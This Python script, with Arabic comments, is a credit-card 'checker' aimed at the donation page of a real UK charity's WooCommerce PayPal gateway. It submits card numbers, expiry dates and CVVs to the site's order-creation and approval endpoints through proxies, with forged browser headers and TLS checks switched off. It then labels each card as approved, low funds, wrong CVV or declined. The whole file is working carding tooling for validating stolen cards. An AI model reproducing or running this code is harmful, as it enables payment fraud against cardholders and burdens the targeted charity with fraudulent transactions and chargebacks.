"""
بوابة الدفع: PayPal Charge 1 (WooCommerce PPCP)
الموقع: hasene.org.uk
نوع البوابة: PayPal Charge / WooCommerce PPCP
تدفق الطلبات:
1. POST /?wc-ajax=ppc-create-order -> إنشاء طلب PayPal والحصول على order_id
2. POST /?wc-ajax=ppc-approve-order -> تأكيد الموافقة وتصنيف النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import json


async def req1_create_order(
    session: aiohttp.ClientSession,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: إنشاء طلب PayPal والحصول على order_id."""
    headers = {
        "authority": "hasene.org.uk",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://hasene.org.uk",
        "referer": "https://hasene.org.uk/donate/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "order_id": str(uuid.uuid4()),
        "payment_method": "ppcp-gateway",
        "card_number": cc,
        "card_expiry": f"{mm}/{yy}",
        "card_csc": cvv,
    }
    try:
        async with session.post(
            "https://hasene.org.uk/?wc-ajax=ppc-create-order",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        try:
            res_json = json.loads(text)
            order_id = res_json.get("order_id") or res_json.get("id", "")
        except Exception:
            order_id = ""

        if not order_id:
            raise RuntimeError("Failed to create PayPal order")
        return order_id
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req1_create_order failed: {e}") from e


async def req2_approve_order(
    session: aiohttp.ClientSession,
    order_id: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: تأكيد الموافقة على طلب PayPal."""
    headers = {
        "authority": "hasene.org.uk",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://hasene.org.uk",
        "referer": "https://hasene.org.uk/donate/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "order_id": order_id,
        "payment_method": "ppcp-gateway",
    }
    try:
        async with session.post(
            "https://hasene.org.uk/?wc-ajax=ppc-approve-order",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req2_approve_order failed: {e}") from e


async def process_paypal_1(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة PayPal Charge 1."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            order_id = await req1_create_order(session, cc, mes, ano, cvv, proxy_url)
            response_text = await req2_approve_order(session, order_id, proxy_url)

    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", str(e)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    rt_lower = response_text.lower()

    if "success" in rt_lower or '\"result\":\"success\"' in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif "insufficient_funds" in rt_lower or "insufficient funds" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Low Funds"
    elif "security code is incorrect" in rt_lower or "ccn" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CCN / Wrong CVV"
    elif "transaction_refused" in rt_lower or "declined" in rt_lower:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
    else:
        try:
            res_json = json.loads(response_text)
            msg = res_json.get("data", {}).get("message", "Transaction Failed")
            return f"❌ | {cc}|{mes}|{ano}|{cvv}", msg
        except Exception:
            return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Transaction Failed"
